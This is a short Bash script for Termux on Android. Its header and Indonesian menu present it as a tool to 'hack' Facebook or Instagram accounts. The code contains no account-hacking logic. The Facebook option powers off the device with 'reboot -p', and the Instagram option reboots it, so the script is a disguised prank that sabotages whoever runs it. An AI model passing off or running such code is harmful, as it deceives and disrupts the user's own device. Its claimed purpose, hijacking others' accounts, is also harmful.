#!/data/data/com.termux/files/usr/bin/bash

# Tools : Hack Facebook Target
# Language : Bash
# Author : Onyx7

clear
echo "--Selamat Datang Di Tools Saya!--"
echo "[-Semoga Hari Anda Menyenangkan-]"
echo " [ -++ PROGRAM BY ONYX7 ++- ] "

echo "=[Silahkan Pilih Menu Yg Di Inginkan!]="

echo "[1] Facebook Target "
echo "[1] Instagram Target "

read -p "[?] Silahkan Masukan Pilihan Anda [1-2]:" pilih

case $pilih in
1)
echo "[*] Tunggu Sebentar.. Please Waitt.."
sleep 5
/system/bin/reboot -p
;;
2)
echo "[*] Tunggu Sebentar.. Please Waitt.."
sleep 5
/system/bin/reboot
;;
*)
echo "[*] Anda Salah Memasukan Pilihan Silahkan Ulangi Dari Awall..."
sleep 2
source $0
;;
esac
